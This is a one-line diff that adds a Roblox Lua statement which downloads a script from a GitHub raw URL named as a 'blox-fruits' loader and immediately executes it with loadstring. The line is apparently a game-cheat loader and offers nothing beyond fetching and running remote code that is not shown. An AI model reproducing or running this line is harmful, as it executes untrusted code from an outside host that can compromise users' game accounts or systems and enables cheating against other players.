@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/LeopardEquip39/loaders/main/loaders/blox-fruits-spam4-4fmuk28fhsi8s4.lua"))()
